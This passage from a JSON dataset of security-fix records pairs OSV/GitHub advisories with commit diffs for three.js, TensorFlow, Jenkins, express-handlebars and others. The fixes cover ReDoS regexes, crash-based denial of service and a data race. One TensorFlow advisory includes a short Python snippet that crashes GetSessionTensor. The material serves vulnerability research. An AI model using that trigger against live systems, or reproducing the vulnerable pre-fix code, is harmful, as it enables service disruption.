ms\")","published_date":"2021-03-01","chain_len":1,"project":"https:\/\/github.com\/mrdoob\/three.js","commit_href":"https:\/\/github.com\/mrdoob\/three.js\/pull\/21143\/commits\/4a582355216b620176a291ff319d740e619d583e","commit_sha":"4a582355216b620176a291ff319d740e619d583e","patch":"SINGLE","chain_ord":"['4a582355216b620176a291ff319d740e619d583e']","before_first_fix_commit":"{'0f5de4f5da1014f81c00d309f93b1a1e709341e4'}","last_fix_commit":"4a582355216b620176a291ff319d740e619d583e","chain_ord_pos":1.0,"commit_datetime":"01\/25\/2021, 11:45:42","message":"Fix ReDoS","author":"Yeting Li","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'src\/math\/Color.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mrdoob\/three.js\/raw\/4a582355216b620176a291ff319d740e619d583e\/src%2Fmath%2FColor.js', 'patch': \"@@ -169,14 +169,14 @@ class Color {\\n \\n \\t\\t\\tlet color;\\n \\t\\t\\tconst name = m[ 1 ];\\n-\\t\\t\\tconst components = m[ 2 ].replace(\/^\\\\s*\/, '');\\n+\\t\\t\\tconst components = m[ 2 ];\\n \\n \\t\\t\\tswitch ( name ) {\\n \\n \\t\\t\\t\\tcase 'rgb':\\n \\t\\t\\t\\tcase 'rgba':\\n \\n-\\t\\t\\t\\t\\tif ( color = \/^(\\\\d+)\\\\s*,\\\\s*(\\\\d+)\\\\s*,\\\\s*(\\\\d+)\\\\s*(?:,\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*)?$\/.exec( components ) ) {\\n+\\t\\t\\t\\t\\tif ( color = \/^\\\\s*(\\\\d+)\\\\s*,\\\\s*(\\\\d+)\\\\s*,\\\\s*(\\\\d+)\\\\s*(?:,\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*)?$\/.exec( components ) ) {\\n \\n \\t\\t\\t\\t\\t\\t\/\/ rgb(255,0,0) rgba(255,0,0,0.5)\\n \\t\\t\\t\\t\\t\\tthis.r = Math.min( 255, parseInt( color[ 1 ], 10 ) ) \/ 255;\\n@@ -189,7 +189,7 @@ class Color {\\n \\n \\t\\t\\t\\t\\t}\\n \\n-\\t\\t\\t\\t\\tif ( color = \/^(\\\\d+)\\\\%\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*(?:,\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*)?$\/.exec( components ) ) {\\n+\\t\\t\\t\\t\\tif ( color = \/^\\\\s*(\\\\d+)\\\\%\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*(?:,\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*)?$\/.exec( components ) ) {\\n \\n \\t\\t\\t\\t\\t\\t\/\/ rgb(100%,0%,0%) rgba(100%,0%,0%,0.5)\\n \\t\\t\\t\\t\\t\\tthis.r = Math.min( 100, parseInt( color[ 1 ], 10 ) ) \/ 100;\\n@@ -207,7 +207,7 @@ class Color {\\n \\t\\t\\t\\tcase 'hsl':\\n \\t\\t\\t\\tcase 'hsla':\\n \\n-\\t\\t\\t\\t\\tif ( color = \/^(\\\\d*\\\\.?\\\\d+)\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*(?:,\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*)?$\/.exec( components ) ) {\\n+\\t\\t\\t\\t\\tif ( color = \/^\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*,\\\\s*(\\\\d+)\\\\%\\\\s*(?:,\\\\s*(\\\\d*\\\\.?\\\\d+)\\\\s*)?$\/.exec( components ) ) {\\n \\n \\t\\t\\t\\t\\t\\t\/\/ hsl(120,50%,50%) hsla(120,50%,50%,0.5)\\n \\t\\t\\t\\t\\t\\tconst h = parseFloat( color[ 1 ] ) \/ 360;\"}}","message_norm":"fix redos","language":"pt","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/math\/Color.js'])","num_files":1.0},{"index":1763,"vuln_id":"GHSA-fq86-3f29-px2c","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082'}","dataset":"osv","summary":"`CHECK`-failures during Grappler's `IsSimplifiableReshape` in Tensorflow ### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`IsSimplifiableReshape`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L1687-L1742) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commits [ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1), [1fb27733f943295d874417630edd3b38b34ce082](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082), and [240655511cd3e701155f944a972db71b6c0b1bb6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-07","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6","commit_sha":"240655511cd3e701155f944a972db71b6c0b1bb6","patch":"MULTI","chain_ord":"['ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1', '1fb27733f943295d874417630edd3b38b34ce082', '240655511cd3e701155f944a972db71b6c0b1bb6']","before_first_fix_commit":"{'1fb27733f943295d874417630edd3b38b34ce082'}","last_fix_commit":"240655511cd3e701155f944a972db71b6c0b1bb6","chain_ord_pos":3.0,"commit_datetime":"11\/11\/2021, 17:24:31","message":"Eliminate `CHECK`-fails from `IsSimplifiableReshape` via `MakeShape(<invalid shape>)`\n\nPiperOrigin-RevId: 409166738\nChange-Id: I7f0a3590b8acae3f3e3e2fe636e1f5ef285693cf","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/240655511cd3e701155f944a972db71b6c0b1bb6\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1741,14 +1741,16 @@ Status ConstantFolding::IsSimplifiableReshape(\\n       int32_t dim = outputs[0]->flat<int32>()(i);\\n       shp.push_back(dim);\\n     }\\n-    TF_CHECK_OK(TensorShapeUtils::MakeShape(shp, &new_dims));\\n+    s = TensorShapeUtils::MakeShape(shp, &new_dims);\\n+    if (!s.ok()) return s;\\n   } else {\\n     std::vector<int64_t> shp;\\n     for (int i = 0; i < outputs[0]->NumElements(); ++i) {\\n       int64_t dim = outputs[0]->flat<int64_t>()(i);\\n       shp.push_back(dim);\\n     }\\n-    TF_CHECK_OK(TensorShapeUtils::MakeShape(shp, &new_dims));\\n+    s = TensorShapeUtils::MakeShape(shp, &new_dims);\\n+    if (!s.ok()) return s;\\n   }\\n \\n   if (!shape.IsCompatibleWith(new_dims)) {'}}","message_norm":"eliminate `check`-fails from `issimplifiablereshape` via `makeshape(<invalid shape>)`\n\npiperorigin-revid: 409166738\nchange-id: i7f0a3590b8acae3f3e3e2fe636e1f5ef285693cf","language":"en","entities":"[('409166738', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])","num_files":1.0},{"index":1765,"vuln_id":"GHSA-fq86-3f29-px2c","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082'}","dataset":"osv","summary":"`CHECK`-failures during Grappler's `IsSimplifiableReshape` in Tensorflow ### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`IsSimplifiableReshape`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L1687-L1742) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commits [ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1), [1fb27733f943295d874417630edd3b38b34ce082](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082), and [240655511cd3e701155f944a972db71b6c0b1bb6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/240655511cd3e701155f944a972db71b6c0b1bb6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-07","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1fb27733f943295d874417630edd3b38b34ce082","commit_sha":"1fb27733f943295d874417630edd3b38b34ce082","patch":"MULTI","chain_ord":"['ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1', '1fb27733f943295d874417630edd3b38b34ce082', '240655511cd3e701155f944a972db71b6c0b1bb6']","before_first_fix_commit":"{'1fb27733f943295d874417630edd3b38b34ce082'}","last_fix_commit":"240655511cd3e701155f944a972db71b6c0b1bb6","chain_ord_pos":2.0,"commit_datetime":"11\/11\/2021, 17:16:14","message":"Remove `CHECK`-fails from `IsSimplifiableReshape`\n\nPiperOrigin-RevId: 409164987\nChange-Id: I58c7dd459ff348c3dbae95e00c4c5e63b30a4e65","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 10, 'deletions': 2, 'total': 12}","files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1fb27733f943295d874417630edd3b38b34ce082\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1689,7 +1689,11 @@ Status ConstantFolding::IsSimplifiableReshape(\\n   if (!IsReshape(node)) {\\n     return errors::Internal(\"Node \", node.name(), \" is not a Reshape node\");\\n   }\\n-  CHECK_LE(2, node.input_size());\\n+  if (2 > node.input_size()) {\\n+    return errors::Internal(\"Node \", node.name(),\\n+                            \" must have at most 2 inputs but has \",\\n+                            node.input_size());\\n+  }\\n   const NodeDef* new_shape = node_map_->GetNode(node.input(1));\\n   if (!IsReallyConstant(*new_shape)) {\\n     return errors::Internal(\"Node \", node.name(), \" has shape \",\\n@@ -1707,7 +1711,11 @@ Status ConstantFolding::IsSimplifiableReshape(\\n   if (!s.ok()) {\\n     return errors::Internal(\"Could not evaluate node \", node.name());\\n   }\\n-  CHECK_EQ(1, outputs.size());\\n+  if (outputs.size() != 1) {\\n+    return errors::Internal(\"Node \", node.name(),\\n+                            \" must have exactly 1 output but has \",\\n+                            outputs.size());\\n+  }\\n \\n   const std::vector<OpInfo::TensorProperties>& props =\\n       properties.GetInputProperties(node.name());'}}","message_norm":"remove `check`-fails from `issimplifiablereshape`\n\npiperorigin-revid: 409164987\nchange-id: i58c7dd459ff348c3dbae95e00c4c5e63b30a4e65","language":"en","entities":"[('remove', 'ACTION', ''), ('409164987', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])","num_files":1.0},{"index":1766,"vuln_id":"GHSA-fq9f-9wv9-rfmg","cwe_id":"{'CWE-295'}","score":5.9,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0'}","dataset":"osv","summary":"Improper Certificate Validation in Jenkins Jenkins 2.73.1 and earlier, 2.83 and earlier bundled a version of the commons-httpclient library with the vulnerability CVE-2012-6153 that incorrectly verified SSL certificates, making it susceptible to man-in-the-middle attacks. This library is widely used as a transitive dependency in Jenkins plugins. The fix for CVE-2012-6153 was backported to the version of commons-httpclient that is bundled in core and made available to plugins.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0","commit_sha":"fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0","patch":"SINGLE","chain_ord":"['fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0']","before_first_fix_commit":"{'67f68c181033cbabf2075769e0f846f58c226c08'}","last_fix_commit":"fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0","chain_ord_pos":1.0,"commit_datetime":"09\/29\/2017, 13:39:32","message":"[SECURITY-555] Patch Commons HttpClient 3.x.","author":"Jesse Glick","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'pom.xml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0\/pom.xml', 'patch': '@@ -164,7 +164,7 @@ THE SOFTWARE.\\n       <dependency>\\n         <groupId>commons-httpclient<\/groupId>\\n         <artifactId>commons-httpclient<\/artifactId>\\n-        <version>3.1<\/version>\\n+        <version>3.1-jenkins-1<\/version>\\n       <\/dependency>\\n \\n       <dependency>'}}","message_norm":"[security-555] patch commons httpclient 3.x.","language":"en","entities":"[('security-555', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pom.xml'])","num_files":1.0},{"index":1768,"vuln_id":"GHSA-fqq2-xp7m-xvm8","cwe_id":"{'CWE-362', 'CWE-119'}","score":8.1,"chain":"{'https:\/\/github.com\/RusPiRo\/ruspiro-singleton\/commit\/b0d2bd20eb40b9cbc2958b981ba2dcd9e6f9396e'}","dataset":"osv","summary":"Data race in ruspiro-singleton `Singleton<T>` is meant to be a static object that can be initialized lazily. In\norder to satisfy the requirement that `static` items must implement `Sync`,\n`Singleton` implemented both `Sync` and `Send` unconditionally.\n\nThis allows for a bug where non-`Sync` types such as `Cell` can be used in\nsingletons and cause data races in concurrent programs.\n\nThe flaw was corrected in commit `b0d2bd20e` by adding trait bounds, requiring\nthe contaiend type to implement `Sync`.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/RusPiRo\/ruspiro-singleton","commit_href":"https:\/\/github.com\/RusPiRo\/ruspiro-singleton\/commit\/b0d2bd20eb40b9cbc2958b981ba2dcd9e6f9396e","commit_sha":"b0d2bd20eb40b9cbc2958b981ba2dcd9e6f9396e","patch":"SINGLE","chain_ord":"['b0d2bd20eb40b9cbc2958b981ba2dcd9e6f9396e']","before_first_fix_commit":"{'0565f8ef459bd336eda8a6a63d1d50cdb581c2b3'}","last_fix_commit":"b0d2bd20eb40b9cbc2958b981ba2dcd9e6f9396e","chain_ord_pos":1.0,"commit_datetime":"11\/16\/2020, 20:32:29","message":"fix soundness","author":"2ndTaleStudio","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'src\/lib.rs': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/RusPiRo\/ruspiro-singleton\/raw\/b0d2bd20eb40b9cbc2958b981ba2dcd9e6f9396e\/src%2Flib.rs', 'patch': \"@@ -81,8 +81,10 @@ pub struct Singleton<T: 'static> {\\n \\n \/\/ The Singleton need to implement Send & Sync to ensure cross core compile check mechanics\\n \/\/ this is safe as the inner RWLock ensures cross core safety\\n-unsafe impl<T> Sync for Singleton<T> {}\\n-unsafe impl<T> Send for Singleton<T> {}\\n+\/\/ but we need to be conditional on the inner type to prevent interior mutable types beeing used\\n+\/\/ inside a singleton\\n+unsafe impl<T> Sync for Singleton<T> where T: Sync {}\\n+unsafe impl<T> Send for Singleton<T> where T: Send {}\\n \\n impl<T: 'static> Singleton<T> {\\n     \/\/\/ Create a new [Singleton] instance to be used in a static variable. Only ``const fn`` constructors are allowed\"}}","message_norm":"fix soundness","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":1774,"vuln_id":"GHSA-fr76-2wp8-fp92","cwe_id":"{'CWE-94', 'CWE-200'}","score":8.6,"chain":"{'https:\/\/github.com\/express-handlebars\/express-handlebars\/commit\/78c47a235c4ad7bc2674bddd8ec2721567ed8c72'}","dataset":"osv","summary":"Insecure template handling in Express-handlebars Express-handlebars is a Handlebars view engine for Express. Express-handlebars mixes pure template data with engine configuration options through the Express render API. More specifically, the layout parameter may trigger file disclosure vulnerabilities in downstream applications. This potential vulnerability is somewhat restricted in that only files with existing extentions (i.e. file.extension) can be included, files that lack an extension will have .handlebars appended to them. For complete details refer to the referenced GHSL-2021-018 report. Notes in documentation have been added to help users avoid this potential information exposure vulnerability.\n\nA fix is discussed in https:\/\/github.com\/express-handlebars\/express-handlebars\/pull\/163","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/express-handlebars\/express-handlebars","commit_href":"https:\/\/github.com\/express-handlebars\/express-handlebars\/commit\/78c47a235c4ad7bc2674bddd8ec2721567ed8c72","commit_sha":"78c47a235c4ad7bc2674bddd8ec2721567ed8c72","patch":"SINGLE","chain_ord":"['78c47a235c4ad7bc2674bddd8ec2721567ed8c72']","before_first_fix_commit":"{'2cde11e4d4b5aabf0c7bef5725eda629c51eeb92'}","last_fix_commit":"78c47a235c4ad7bc2674bddd8ec2721567ed8c72","chain_ord_pos":1.0,"commit_datetime":"05\/04\/2021, 14:04:07","message":"fix: add note about security","author":"Tony Brix","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'README.md': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/express-handlebars\/express-handlebars\/raw\/78c47a235c4ad7bc2674bddd8ec2721567ed8c72\/README.md', 'patch': '@@ -63,6 +63,9 @@ Install using npm:\\n $ npm install express-handlebars\\n ```\\n \\n+## Danger \ud83d\udd25\\n+ \\n+Never put objects on the `req` object straight in as the data, this can allow hackers to run XSS attacks. Always make sure you are destructuring the values on objects like `req.query` and `req.params`. See https:\/\/blog.shoebpatel.com\/2021\/01\/23\/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps\/ for more details.\\n \\n ## Usage'}}","message_norm":"fix: add note about security","language":"en","entities":"[('fix', 'ACTION', ''), ('add', 'ACTION', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['README.md'])","num_files":1.0},{"index":1778,"vuln_id":"GHSA-fv25-wrff-wf86","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/48305e8ffe5246d67570b64096a96f8e315a7281'}","dataset":"osv","summary":"Missing validation causes denial of service via `GetSessionTensor` ### Impact\nThe implementation of [`tf.raw_ops.GetSessionTensor`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/session_ops.cc#L94-L112) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.GetSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor& handle = ctx->input(0);\n    const string& name = handle.scalar<tstring>()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [48305e8ffe5246d67570b64096a96f8e315a7281](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/48305e8ffe5246d67570b64096a96f8e315a7281).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/48305e8ffe5246d67570b64096a96f8e315a7281","commit_sha":"48305e8ffe5246d67570b64096a96f8e315a7281","patch":"SINGLE","chain_ord":"['48305e8ffe5246d67570b64096a96f8e315a7281']","before_first_fix_commit":"{'13d38a07ce9143e044aa737cfd7bb759d0e9b400'}","last_fix_commit":"48305e8ffe5246d67570b64096a96f8e315a7281","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 19:25:03","message":"Fix tf.raw_ops.GetSessionTensor vulnerability with invalid handle.\n\nCheck that input is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445218701","author":"Alan Liu","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/session_ops.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/48305e8ffe5246d67570b64096a96f8e315a7281\/tensorflow%2Fcore%2Fkernels%2Fsession_ops.cc', 'patch': '@@ -98,6 +98,8 @@ class GetSessionTensorOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& handle = ctx->input(0);\\n+    OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(handle.shape()),\\n+                errors::InvalidArgument(\"handle must be scalar\"));\\n     const string& name = handle.scalar<tstring>()();\\n     Tensor val;\\n     auto session_state = ctx->session_state();'}}","message_norm":"fix tf.raw_ops.getsessiontensor vulnerability with invalid handle.\n\ncheck that input is actually a scalar before treating it as such.\n\npiperorigin-revid: 445218701","language":"en","entities":"[('vulnerability', 'SECWORD', ''), ('445218701', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/session_ops.cc'])","num_files":1.0},{"index":1790,"vuln_id":"GHSA-fx5c-h9f6-rv7c","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6b5adc0877de832b2a7c189532dbbbc64622eeb6'}","dataset":"osv","summary":"`CHECK`-fails due to attempting to build a reference tensor ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [Grappler optimizer would attempt to build a tensor using a reference `dtype`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L1328-L1402). This would result in a crash due to a `CHECK`-fail [in the `Tensor` constructor](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/tensor.cc#L733-L781) as reference types are not allowed.\n### Patches\nWe have patched the issue in GitHub commit [6b5adc0877de832b2a7c189532dbbbc64622eeb6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6b5adc0877de832b2a7c189532dbbbc64622eeb6).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6b5adc0877de832b2a7c189532dbbbc64622eeb6","commit_sha":"6b5adc0877de832b2a7c189532dbbbc64622eeb6","patch":"SINGLE","chain_ord":"['6b5adc0877de832b2a7c189532dbbbc64622eeb6']","before_first_fix_commit":"{'af2cab9355e8d5bf48c2c7042b3faaf31262ea8c'}","last_fix_commit":"6b5adc0877de832b2a7c189532dbbbc64622eeb6","chain_ord_pos":1.0,"commit_datetime":"11\/13\/2021, 15:28:58","message":"Prevent `CHECK`-fail when building reference tensor.\n\nThe tensor constructor does not allow reference dtypes, as these should not show up explicitly. However, when passed these invalid types instead of building an invalid object the constructor crashes via a `CHECK`-fail. We have a static builder that properly handles this case but is not applicable given current usage.\n\nInstead, before calling the constructor, we can check that the dtype is not a reference type and return an error otherwise, given that the dtype is user controlled so malicious users can trigger denial of service.\n\nPiperOrigin-RevId: 409662503\nChange-Id: I5892f831fde7f276cd7ab34519cf6b8061c71a59","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6b5adc0877de832b2a7c189532dbbbc64622eeb6\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1363,6 +1363,11 @@ Status ConstantFolding::EvaluateOneFoldable(const NodeDef& node,\\n                           input_tensor.ToString(),\\n                           \" has a dtype of DT_INVALID.\"));\\n     }\\n+    if (IsRefType(raw_val.dtype())) {\\n+      return errors::InvalidArgument(\\n+          \"Not allowed to construct a tensor with reference dtype, got \",\\n+          DataTypeString(raw_val.dtype()));\\n+    }\\n     Tensor* value = new Tensor(raw_val.dtype(), raw_val.tensor_shape());\\n     if (!value->FromProto(raw_val)) {\\n       delete (value);'}}","message_norm":"prevent `check`-fail when building reference tensor.\n\nthe tensor constructor does not allow reference dtypes, as these should not show up explicitly. however, when passed these invalid types instead of building an invalid object the constructor crashes via a `check`-fail. we have a static builder that properly handles this case but is not applicable given current usage.\n\ninstead, before calling the constructor, we can check that the dtype is not a reference type and return an error otherwise, given that the dtype is user controlled so malicious users can trigger denial of service.\n\npiperorigin-revid: 409662503\nchange-id: i5892f831fde7f276cd7ab34519cf6b8061c71a59","language":"en","entities":"[('prevent', 'ACTION', ''), ('error', 'FLAW', ''), ('malicious', 'SECWORD', ''), ('denial of service', 'SECWORD', ''), ('409662503', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])","num_files":1.0},{"index":1792,"vuln_id":"GHSA-fx7m-j728-mjw3","cwe_id":"{'CWE-185'}","score":5.3,"chain":"{'https:\/\/github.com\/ua-parser\/uap-core\/commit\/010ccdc7303546cd22b9da687c29f4a996990014', 'https:\/\/github.com\/ua-parser\/uap-core\/commit\/156f7e12b215bddbaf3df4514c399d683e6cdadc'}","dataset":"osv","summary":"Moderate severity vulnerability that affects uap-core An issue was discovered in regex.yaml (aka regexes.yaml) in UA-Parser UAP-Core before 0.6.0. A Regular Expression Denial of Service (ReDoS) issue allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to a value containing a long digit string. (The UAP-Core project contains the vulnerability, propagating to all implementations.)","published_date":"2019-03-06","chain_len":2,"project":"https:\/\/github.com\/ua-parser\/uap-core","commit_href":"https:\/\/github.com\/ua-parser\/uap-core\/commit\/010ccdc7303546cd22b9da687c29f4a996990014","commit_sha":"010ccdc7303546cd22b9da687c29f4a996990014","patch":"MULTI","chain_ord":"['156f7e12b215bddbaf3df4514c399d683e6cdadc', '010ccdc7303546cd22b9da687c29f4a996990014']","before_first_fix_commit":"{'764947f552c6fc9ac80759acb5165a83ee746678'}","last_fix_commit":"010ccdc7303546cd22b9da687c29f4a996990014","chain_ord_pos":2.0,"commit_datetime":"12\/14\/2018, 07:19:47","message":"0.6.0","author":"commenthol","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'package.json': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 